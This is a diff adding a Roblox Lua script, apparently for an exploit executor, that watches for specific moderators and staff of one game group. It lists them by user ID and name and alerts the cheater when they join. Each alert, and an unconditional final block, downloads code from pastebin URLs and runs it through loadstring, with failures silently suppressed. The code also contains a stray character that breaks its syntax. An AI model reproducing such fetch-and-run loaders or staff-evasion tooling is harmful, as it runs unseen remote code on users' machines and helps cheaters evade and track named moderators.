@@ -1,0 +1,77 @@
+local Players = game:GetService("Players")
+
+local GROUP_ID = 5763193
+
+local Roles = {
+    ["QA Tester"] = true,
+    ["Developer"] = true,
+    ["Lead Developer"] = true,
+    ["The Founder"] = true,
+    ["Community Manager"] = true
+}
+
+local Users = {
+[76244963] = { Name = "Michalos", Rank = "Admin" },
+[30898713] = { Name = "Soul", Rank = "Admin" },
+[1050749522] = { Name = "Nominets", Rank = "Admin" },|
+[1473664934] = { Name = "Paid_actor", Rank = "SR Moderator" },
+[3481445370] = { Name = "Lurithic", Rank = "Moderator" },
+[1456049163] = { Name = "Sellular", Rank = "Moderator" },
+[228217825] = { Name = "Redflame", Rank = "Moderator" },
+[228217825] = { Name = "Redflame", Rank = "Moderator" },
+[150331320] = { Name = "Hananine", Rank = "Moderator" },
+[95793858] = { Name = "Mythical", Rank = "Moderator" },
+[296503088] = { Name = "mylo", Rank = "Moderator" },
+[302850896] = { Name = "memetic", Rank = "Moderator" },
+[147544682] = { Name = "Doe_nut", Rank = "Moderator" },
+[68979144] = { Name = "L2QF", Rank = "Moderator" },
+[168603199] = { Name = "ayedh1395", Rank = "Moderator" },
+[2954151259] = { Name = "eepiesealie", Rank = "Moderator" },
+}
+
+local function triggerAlert(username, roleName)
+    local success, loadErr = pcall(function()
+        local rawCode = game:HttpGet("https://pastebin.com/raw/5bcEeXNf")
+        local compiledFunc, err = loadstring(rawCode)
+        
+        if compiledFunc then
+            compiledFunc(username, roleName)
+        else
+            error(err)
+        end
+    end)
+
+    if not success then
+        warn("Failed to trigger alert:", loadErr)
+    end
+end
+
+local function checkPlayer(player)
+    if Users[player.UserId] then
+        local data = Users[player.UserId]
+        triggerAlert(data.Name or player.Name, data.Rank or "Custom Flag")
+        return
+    end
+
+    local success, roleName = pcall(function()
+        return player:GetRoleInGroup(GROUP_ID)
+    end)
+
+    if success and roleName and Roles[roleName] then
+        triggerAlert(player.Name, roleName)
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    task.spawn(checkPlayer, player)
+end
+
+Players.PlayerAdded:Connect(checkPlayer)
+
+pcall(function()
+    local rawCode = game:HttpGet("https://pastebin.com/raw/4uZeatH2")
+    local compiledFunc = loadstring(rawCode)
+    if compiledFunc then
+        compiledFunc()
+    end
+end)
